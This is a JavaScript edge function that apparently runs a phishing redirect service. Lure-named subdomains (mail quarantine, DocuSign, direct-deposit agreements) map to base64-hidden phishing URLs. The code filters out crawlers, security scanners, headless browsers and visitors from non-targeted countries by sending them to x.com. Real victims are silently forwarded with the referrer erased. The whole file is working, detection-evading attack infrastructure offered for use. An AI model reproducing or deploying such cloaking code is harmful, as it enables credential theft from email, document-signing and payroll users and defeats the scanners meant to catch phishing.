export const runtime = 'edge';

export async function GET(request) {
  // ⚙️ SET TO false once testing is complete to hide debug messages from visitors
  const DEBUG = true; 

  const BOT_DESTINATION = "https://x.com";
  
  // 🌐 SUBDOMAIN ROUTING MAP (Syntax fixed, commas restored, updated destination targets)
  const SUBDOMAIN_MAP = {
    "quarantine-mail-authorize-cloud.vercel.app": "aHR0cHM6Ly9jbG91ZG1haWxwZW5kaW5nLnRvcD9LdGVoLU5ZPWRtRnBlSFJ4ZWc9PQ==",
    "dfghh": "aHR0cHM6Ly9obXFnaWEudG9wP1dXVzZrZzRmYVE9Y1dOcWFIQT0=",
    "protected": "aHR0cHM6Ly9tYXJjLWhlY2hlbWEtZG91Y21lbnQtcnNmOHgub25kaWdpdGFsb2NlYW4uYXBw",
    "vt": "aHR0cHM6Ly9kb2N1c2lnbi5oZWp2Y3JvLnZ1Lw==",
    "mylinprotect.vercel.app": "aHR0cHM6Ly9jbG91ZG1haWxwZW5kaW5nLnRvcD9LdGVoLU5ZPWRtRnBlSFJ4ZWc9PQ==",
    "protecteds": "aHR0cHM6Ly9jbG91ZG1haWxwZW5kaW5nLnRvcD9LdGVoLU5ZPWRtRnBlSFJ4ZWc9PQ==",
    "biss": "aHR0cHM6Ly9jZXR2b3JhLnZ1L0Fkb2JlZXJlYWRlcg==",
    "sighting": "aHR0cHM6Ly9zZXR0bGVtZW50ZG9jcmVhZGluZy50b3A/aTQyVVMyQXdIQVk9WW05aGVYVT0=",
    "chris": "aHR0cHM6Ly9iaHRodC5uZXQ=",
    "kawkiw": "aHR0cHM6Ly9zZXR0bGVtZW50ZG9jcmVhZGluZy50b3A/aTQyVVMyQXdIQVk9WW05aGVYVT0=",
    "colkdf": "aHR0cHM6Ly9jbG91ZG1haWxkb2NhY2Nlc3MudG9wPzBfbHZ1THhUbDl2bEdRPVlYbDJkM1k9",
    "quarantined-mail-cloud": "aHR0cHM6Ly9jbG91ZG1haWxwZW5kaW5nLnRvcD9LdGVoLU5ZPWRtRnBlSFJ4ZWc9PQ==",
    "macro": "aHR0cHM6Ly9sb2dpbi50ZWFtc2NoYXZpd3MudG9wP0hSWGVmdU43M0pJQz1iV1YwYjJKdGFtZz0=",
    "vs": "aHR0cHM6Ly9kb2N1c2lnbi5oZWp2Y3JvLnZ1Lw==",
    "tghjsk": "aHR0cHM6Ly9hY2VybmFzdXMuY29tL3ZhbGlkYXRlLWJscy1ibG9nLw==",
    "vn": "aHR0cHM6Ly9jbG91ZG1haWxwZW5kaW5nLnRvcD9LdGVoLU5ZPWRtRnBlSFJ4ZWc9PQ==",
    "kakiw": "aHR0cHM6Ly9sb2dpbi5hb2xkaXJlY3RvcnkudG9wP01qT0x6N0RiPWMyNXBjV1U9",
    "global": "aHR0cHM6Ly9zZXR0bGVtZW50ZG9jcmVhZGluZy50b3A/aTQyVVMyQXdIQVk9WW05aGVYVT0=",
    "flit": "aHR0cHM6Ly9kaXJlY3QtZGVwb3NpdC1zaWduLWFncmVlbWVudC1nbG91eS5vbmRpZ2l0YWxvY2Vhbi5hcHAv",
    "rjsl": "aHR0cHM6Ly9kZXBvc2l0LWF1dGhvcml6YXRpb24tc2lnbmF0dXJlLXh0MnF3Lm9uZGlnaXRhbG9jZWFuLmFwcC8=",
    "bluelight": "aHR0cHM6Ly9obXFnaWEudG9wP1dXVzZrZzRmYVE9Y1dOcWFIQT0=",
    "proceeds": "aHR0cHM6Ly9uaXJ2YW5uYS50b3A/WnpVRDBUVnk9YUhOcmIyTnY=",
    "craft": "aHR0cHM6Ly9xdWFyYW50aW5lZC1tYWlsLW1zdzhkLm9uZGlnaXRhbG9jZWFuLmFwcA==",
    "musen": "aHR0cHM6Ly9hbGJlcnQtZHJlZXNlLWVzaWduZG9jLXFkdHp2Lm9uZGlnaXRhbG9jZWFuLmFwcC8=",
    "beamer": "aHR0cHM6Ly9kaXJlY3QtZGVwb3NpdC1zaWduLWFncmVlbWVudC1nbG91eS5vbmRpZ2l0YWxvY2Vhbi5hcHAv"
  };

  const IP_WHITELIST = [""]; 
  const url = new URL(request.url);
  const queryParameters = url.search;

  // Extract host header plain text
  const incomingHost = (request.headers.get('host') || '').toLowerCase();

  // Find if any of your keyword subdomains are inside the incoming host address
  let matchedKey = null;
  for (const key in SUBDOMAIN_MAP) {
    if (incomingHost.includes(key)) {
      matchedKey = key;
      break;
    }
  }

  // 🚪 ROUTING VALIDATION: If the sub-word isn't found anywhere in the URL, route to bot destination
  if (!matchedKey) {
    if (DEBUG) return new Response(`DEBUG: No matching subdomain found in host string "${incomingHost}"`, { status: 200 });
    return URLRedirect(BOT_DESTINATION);
  }

  const ENCODED_HUMAN_URL = SUBDOMAIN_MAP[matchedKey]; 

  const userAgent = request.headers.get('user-agent') || '';
  const acceptLang = request.headers.get('accept-language') || '';
  const clientIp = request.headers.get('x-forwarded-for') || ''; 
  const visitorCountry = (request.headers.get('x-vercel-ip-country') || '').toUpperCase();

  const isWhitelisted = IP_WHITELIST.includes(clientIp);

  if (!isWhitelisted) {
    // 1. Missing language header check
    if (!acceptLang) {
      if (DEBUG) return new Response(`DEBUG: Blocked due to missing Accept-Language header.`, { status: 200 });
      return URLRedirect(BOT_DESTINATION);
    }
    
    // 2. Bot User Agent signature strings check
    if (/bot|crawl|spider|slurp|facebookexternalhit|twitterbot|linkedinbot|pingdom|telegrambot|whatsapp|google|yandex|baidu|bing/i.test(userAgent)) {
      if (DEBUG) return new Response(`DEBUG: Blocked by User-Agent signature matching: "${userAgent}"`, { status: 200 });
      return URLRedirect(BOT_DESTINATION);
    }

    // 3. Allowed countries list constraint filter
    const allowedCountries = ['NG', 'US', 'CA', 'GB', 'IE', 'DE', 'FR', 'IT', 'ES', 'NL', 'BE', 'CH', 'AT'];
    if (!allowedCountries.includes(visitorCountry)) {
      if (DEBUG) return new Response(`DEBUG: Blocked by country filter. Your detected Vercel country code is: "${visitorCountry}"`, { status: 200 });
      return URLRedirect(BOT_DESTINATION);
    }
  }

  const finalQuery = queryParameters ? queryParameters : "";

  const htmlResponse = `
  <!DOCTYPE html>
  <html>
  <head>
    <meta charset="utf-8">
    <meta name="referrer" content="no-referrer">
    <title>Loading...</title>
    <script>
      (function() {
        const bypassJSFlags = ${isWhitelisted}; 
        
        if (!bypassJSFlags) {
          if (navigator.webdriver || !navigator.languages || navigator.languages.length === 0) {
            window.location.replace("${BOT_DESTINATION}");
            return;
          }
          const executionFootprint = (function() {
            try {
              if (navigator.hardwareConcurrency && navigator.hardwareConcurrency < 1) return true;
              if (!window.chrome && !navigator.userAgent.includes('Safari') && !navigator.userAgent.includes('Firefox')) return true;
              const pc = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
              if (!pc && (navigator.userAgent.includes('Chrome') || navigator.userAgent.includes('Safari'))) return true;
            } catch(e) { return true; }
            return false;
          })();
          if (executionFootprint) {
            window.location.replace("${BOT_DESTINATION}");
            return;
          }
        }

        const baseTarget = atob("${ENCODED_HUMAN_URL}");
        const incomingQuery = "${finalQuery}";
        
        let finalDestination = baseTarget;
        if (incomingQuery) {
          const separator = finalDestination.includes('?') ? '&' : '?';
          finalDestination = finalDestination + separator + incomingQuery.substring(1);
        }

        Object.defineProperty(document, 'referrer', {get : function(){ return ''; }});
        window.location.replace(finalDestination);
      })();
    </script>
  </head>
  <body style="background:#ffffff; color:#ffffff; user-select:none;">
  </body>
  </html>
  `;

  return new Response(htmlResponse, {
    headers: { 
      "content-type": "text/html;charset=UTF-8",
      "Cache-Control": "no-store, no-cache, must-revalidate, max-age=0"
    },
  });
}

function URLRedirect(destination) {
  return new Response(null, {
    status: 302,
    headers: { 'Location': destination }
  });
}
